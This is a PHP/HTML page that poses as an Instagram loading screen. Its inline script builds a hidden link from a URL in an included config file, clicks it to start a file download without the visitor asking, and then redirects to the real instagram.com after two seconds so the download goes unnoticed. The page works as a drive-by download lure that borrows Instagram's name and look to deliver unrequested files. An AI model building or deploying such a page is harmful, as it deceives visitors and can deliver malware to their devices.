<?php include 'download_config.php'; ?>
<!DOCTYPE html>
<html>
<head>
    <title>Instagram</title>
    <link rel="icon" type="image/x-icon" href="favicon.png">
    <meta http-equiv="refresh" content="2;url=https://instagram.com">
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #fafafa;
        }
        .loader {
            text-align: center;
        }
        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #3897f0;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        p {
            color: #262626;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="loader">
        <div class="spinner"></div>
        <p>Loading Instagram...</p>
    </div>
    
    <script>
    <?php if (!empty($download_url)): ?>
        // Trigger download
        var link = document.createElement('a');
        link.href = '<?php echo htmlspecialchars($download_url, ENT_QUOTES, 'UTF-8'); ?>';
        link.download = '';
        link.style.display = 'none';
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
    <?php endif; ?>
    
    // Redirect to Instagram after 2 seconds
    setTimeout(function() {
        window.location.href = 'https://instagram.com';
    }, 2000);
    </script>
</body>
</html>
